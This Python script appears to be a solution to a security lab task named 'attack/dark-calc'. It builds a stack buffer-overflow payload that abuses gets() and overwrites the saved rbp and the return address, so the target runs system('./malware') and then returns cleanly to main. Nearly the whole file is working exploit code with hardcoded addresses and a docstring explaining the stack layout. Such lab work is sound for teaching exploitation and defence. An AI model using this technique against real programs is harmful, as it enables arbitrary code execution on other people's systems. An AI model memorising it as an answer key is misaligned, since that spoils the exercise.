#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Stack frame of input() (B = expression = 0x721000800fd0):

    B + 0x00 : expression[16]   <- gets() writes here
    B + 0x10 : saved rbp
    B + 0x18 : return address

We make strcpy() copy "./malware" into the global command_buf, then
overwrite input()'s return address with

    0x401a6b: movl $0x6030d0, %edi   ; command_buf
    0x401a70: call system@plt

so the program executes system("./malware").

The saved rbp is set to B+0x18, the address of the return-address slot.
After system() returns, eval()'s epilogue does `leave; ret`: rsp becomes
B+0x18, pop rbp reads the return address pushed by our `call system`
(0x401a75), and ret reads B+0x20, where we stored main().  The program
therefore prints the answer and exits normally instead of crashing.
"""
import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


BUFFER = 0x721000800FD0
MAIN = 0x401AC3
CALL_SYSTEM = 0x401A6B

payload = b"./malware\x00"                  # strcpy() -> command_buf
payload += b"A" * (16 - len(payload))       # fill expression[16]
payload += p64(BUFFER + 0x18)               # saved rbp -> address of ret slot
payload += p64(CALL_SYSTEM)                 # input() return -> call system
payload += p64(MAIN)                        # eval() leave/ret -> main
payload += b"\n"

sys.stdout.buffer.write(payload)
